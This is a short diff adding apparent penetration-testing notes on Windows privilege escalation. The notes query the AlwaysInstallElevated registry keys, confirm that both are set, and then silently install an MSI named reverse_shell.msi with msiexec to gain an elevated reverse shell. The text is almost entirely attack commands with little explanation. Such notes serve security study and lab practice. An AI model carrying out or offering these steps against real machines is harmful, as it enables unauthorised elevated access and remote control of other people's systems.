@@ -1,0 +1,10 @@
+# Query the registry for AlwaysInstallElevated keys:
+    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+## Note that both keys are set to 1 (0x1).
+
+## Run reverse shell Windows Installer
+
+## For example, with remote terminal
+    msiexec /quiet /qn /i C:\reverse_shell.msi
